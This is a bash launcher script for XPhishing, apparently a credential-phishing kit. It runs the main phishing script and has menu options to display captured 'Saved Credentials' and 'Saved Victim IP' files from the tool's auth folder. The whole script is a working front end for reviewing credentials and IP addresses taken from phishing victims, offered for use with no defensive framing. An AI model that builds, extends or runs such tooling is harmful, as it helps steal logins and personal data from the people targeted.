#!/bin/bash

# https://github.com/Amarchillale/XPhishing

if [[ $(uname -o) == *'Android'* ]];then
	XPHISHING_ROOT="/data/data/com.termux/files/usr/opt/Xphishing"
else
	export XPHISHING_ROOT="/opt/Xphishing"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run XPhishing type \`XPhishing\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $XPHISHING_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $XPHISHING_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $XPHISHING_ROOT
	bash ./xphishing.sh
fi
